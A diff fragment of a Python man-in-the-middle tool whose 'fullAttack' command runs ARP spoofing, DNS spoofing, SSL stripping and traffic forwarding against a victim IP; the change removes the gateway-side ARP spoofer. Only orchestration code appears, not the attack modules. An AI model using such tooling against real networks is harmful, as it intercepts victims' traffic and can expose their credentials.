@@ -99,17 +99,14 @@ def main():
         if args.ipVictim is None or args.ipGateway is None or args.siteToSpoof is None:
             sys.exit("Usage: python main.py fullAttack --ipVictim <ip> --macVictim <mac> --ipGateway <ip> --siteToSpoof <url> --get_file <file> --post_file <file>")
         arp_spoofer_victim = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipGateway)
-        arp_spoofer_gateway = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipGateway, args.ipVictim)
         dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
         ssl_stripper = SSLStripper(args.interface, args.ipVictim, args.ipAttacker, args.siteToSpoof)
         forwarder = Forwarder(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof, args.get_file, args.post_file)
         arp_spoofer_victim_thread = threading.Thread(target=arp_spoofer_victim.spoof)
-        arp_spoofer_gateway_thread = threading.Thread(target=arp_spoofer_gateway.spoof)
         dns_spoofer_thread = threading.Thread(target=dns_spoofer.spoof)
         ssl_stripper_thread = threading.Thread(target=ssl_stripper.strip)
         forwarder_thread = threading.Thread(target=forwarder.forward)
         arp_spoofer_victim_thread.start()
-        arp_spoofer_gateway_thread.start()
         dns_spoofer_thread.start()
         ssl_stripper_thread.start()
         forwarder_thread.start()
@@ -117,7 +114,6 @@ def main():
         forwarder_thread.join()
         ssl_stripper_thread.join()
         dns_spoofer_thread.join()
-        arp_spoofer_gateway_thread.join()
         arp_spoofer_victim_thread.join()
 
     elif args.command == 'listInterfaces':
